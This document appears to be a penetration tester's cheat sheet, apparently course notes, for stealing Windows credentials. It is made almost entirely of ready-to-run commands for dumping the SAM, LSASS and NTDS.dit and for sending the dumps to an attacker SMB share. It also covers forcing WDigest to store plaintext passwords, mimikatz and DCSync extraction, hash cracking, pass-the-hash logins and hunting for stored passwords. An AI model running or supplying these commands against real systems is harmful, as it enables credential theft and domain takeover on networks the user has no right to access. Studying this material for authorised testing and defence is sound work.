## Attacking SAM
```bash
hklm\sam # Contains the hashes associated with local account passwords.
hklm\system # Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security # Contains cached credentials for domain accounts and Services Creds
# Copying SAM Registry Hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# move the registrys to attacker machine
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tmp /tmp # Creating a Share
move sam.save \\10.10.15.16\tmp
move security.save \\10.10.15.16\tmp
move system.save \\10.10.15.16\tmp

# Dumping Hashes with Impacket's secretsdump.py
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# or remotly (auto)
mpacket-secretsdump -k -no-pass -target-ip 192.168.210.10 internal.zsm.local/Administrator@ZPH-SVRDC01.zsm.local

# Cracking Hashes with Hashcat
sudo vim hashestocrack.txt # store the LM hashes here 
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Remote Dumping & LSA Secrets Considerations
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa # Dumping LSA Secrets Remotely (Domains  cached creds + Services creds )
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam # Dumping SAM Remotely

----------------------------
# with mimikatz (auto)
mimikatz.exe "privilege::debug" "lsadump::sam" exit

# with netexec
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump #  if fail try this old method (similar to secretdump)

```
## Attacking LSASS
```bash
# 1_ Dumping LSASS Process Memory
## Task Manager Method (if we have GUI-based interactive session): 
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file # C:\Users\loggedonusersdirectory\AppData\Local\Temp

## Rundll32.exe & Comsvcs.dll Method:
### Finding LSASS PID
tasklist /svc # Finding LSASS PID in cmd
Get-Process lsass # Finding LSASS PID in PowerShell
### Creating lsass.dmp using PowerShell 
rundll32 "C:\windows\system32\comsvcs.dll", MiniDump <PID> C:\lsass.dmp full # AV tools recognize this as malicious

# 2_ Using Pypykatz to Extract Credentials:
pypykatz lsa minidump /home/peter/Documents/lsass.dmp # Using Pypykatz to Extract Credentials
# [MSV] is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database, Pypykatz extracted the (SID, Username, Domain, and even the NT & SHA1) password hashes associated with the bob user account's logon session stored in LSASS process memory.
# [WDIGEST] is an older authentication protocol enabled by default in Windows XP,Windows 8 and Windows Server 2003 - Windows Server 2012, SASS caches credentials used by WDIGEST in clear-text,Modern Windows operating systems have WDIGEST disabled by default.
# [Kerberos] is a network authentication protocol used by Active Directory in Windows Domain environments,LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos
# [DPAPI] is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications,Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts

# 3_ Cracking the NT Hash with Hashcat:
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

# if u can't crack the hash u can force lsa to save password in plain text so
  # how ? => Enable WDigest (store plaintext passwords)

------------------------------------
# with mimikatz (auto)
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit

# with mimikatz & WDigest (plain-text passwords)
  # WDigest: old Windows auth protocol storing plaintext passwords in LSASS.
  # Disabled by default in modern Windows > win server 2012 (UseLogonCredential=0).
# Enable WDigest (store plaintext passwords)
reg add "HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" # check , UseLogonCredential  REG_DWORD  0x1
shutdown /r /t 0 /f # Reboot required
# Dump creds with Mimikatz
sekurlsa::logonpasswords   # all creds + plain text
sekurlsa::wdigest          # WDigest creds only

# with netexec
nxc smb victim -u ‘’ -p ‘’ -M lsassy
netexec smb MS01 -u <user> -p "<pass>" -M nanodump # better


```

## Attacking Windows Credential Manager

```bash
## Windows Vault and Credential Manager

  # Credential Manager allows users and applications to securely store credentials relevant to other systems and websites , the  Credential Lockers (formerly Windows Vaults) store in:
  %UserProfile%\AppData\Local\Microsoft\Vault\
  %UserProfile%\AppData\Local\Microsoft\Credentials\
  %UserProfile%\AppData\Roaming\Microsoft\Vault\
  %ProgramData%\Microsoft\Vault\
  %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

  # types of credentials Windows stores:
    # Web Credentials: Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.
    # Windows Credentials: Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.

 # export Windows Vaults to .crd files
  rundll32 keymgr.dll,KRShowKeyMgr # or via Control Panel too

## Enumerating credentials with cmdkey

  whoami # sadams
  cmdkey /list #  # example we find Target: Domain:interactive=SRV01\mcharles 
    # Target: computer, domain name, or a special identifier.
    # Type:   generic for general creds or Domain Password 
    # User:   the user associated with the cerds 
    # Persistence: indicate whether a credential is saved persistently on the computer
   
  # impersonate the stored user
  runas /savecred /user:SRV01\mcharles cmd

## Extracting credentials with Mimikatz
  mimikatz.exe
  privilege::debug
  sekurlsa::credman
  [1] # Note:Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).

```

## Attacking Active Directory & NTDS.dit

```bash 
# NTDS = _NT Directory Services_ (refers to Active Directory)
    
# .dit = _Directory Information Tree_ (the database format)

### search for usernames 

    # Common username conventions (example: Jane Jill Doe)
    jdoe         # first initial + last name
    jjdoe        # first + middle initial + last name
    janedoe      # first name + last name
    jane.doe     # first name dot last name
    doe.jane     # last name dot first name
    doedoehacksstuff  # nickname or custom alias
    
    # google dorks: “@inlanefreight.com” 
    # “inlanefreight.com filetype:pdf” | exiftool file.pdf (search for Author)

### Creating a Custom list of Usernames
    echo "Ben Williamson" >> names.txt
    ./username-anarchy -i /home/ltnbob/names.txt > usernames.txt

###  Launching the Attack with CrackMapExec
    crackmapexec smb 10.129.201.57 -u <username> -p /usr/share/wordlists/fasttrack.txt

###  Connecting to a DC with Evil-WinRM 
# we have the winrm service open (port 5985,5986) 
    evil-winrm -i 10.129.201.57  -u <user> -p '<password>' 

### Checking Local Group Membership
    net localgroup  # *Administrators

### Checking User Account Privileges including Domain
    net user <user> # Global Group memberships: *Domain Users *Domain Admins
[+] # This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file

###  Creating Shadow Copy of C:
    vssadmin CREATE SHADOW /For=C: # Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

###  Copying NTDS.dit from the VSS 
    mkdir C:\NTDS
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit # copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

###  Transferring NTDS.dit to Attack Host
    cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\<shared_folder>
    
    reg.exe save hklm\system C:\system.save 
    cmd.exe /c move C:\system.save \\10.10.15.30\<shared_folder> # move the system registry too
### Extracting hashes from NTDS.dit
    secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt

### A Faster Method: Using cme to Capture NTDS.dit
    crackmapexec smb 10.129.201.57 -u <username> -p P@55w0rd! --ntds

###  another Method: Using mimikatz:
lsadump::ntds /system:<SYSTEM> /ntds:<ntds.dit>
lsadump::dcsync /domain:<DOMAIN.LOCAL> /user:<DOMAIN>\administrator # need domain admin privileges.
  
###  Cracking a Single Hash with Hashcat
    sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

[?] # What if we are unsuccessful in cracking a hash? => pass the hash attack

### Pass-the-Hash Considerations    
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

## Credential Hunting in Windows
```bash
# Common terms to search for credentials :
# Passwords,  Passphrases, Keys, Username, User, Creds, Users, Passkeys, Secrets, configuration, dbcredential, dbpassword, pwd, Login, Credentials.

#  Search Tools:

# With access to the GUI, it is worth attempting to use `Windows Search` to find files on the target using some of the keywords mentioned above.

## Lazagne.exe (https://github.com/AlessandroZ/LaZagne/releases/)
start lazagne.exe all

# findstr 
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.ods

# Credential Hunting - Places to Look

- Passwords in Group Policy (GPP) within the SYSVOL share
- Passwords in scripts stored in the SYSVOL share
- Passwords in scripts located on IT/shared drives
- Passwords in `web.config` files (commonly found on dev machines or IT shares)
- `unattend.xml` files (often contain plaintext credentials)
- Passwords stored in Active Directory (AD) user/computer description fields
- KeePass database files
  - Extract hash, crack it, and gain extensive access
  - Typically found on user systems or shared drives
- Common files with credentials:
  - `pass.txt`
  - `passwords.docx`
  - `passwords.xlsx`
  - Often located on user systems, shared drives, or SharePoint
```
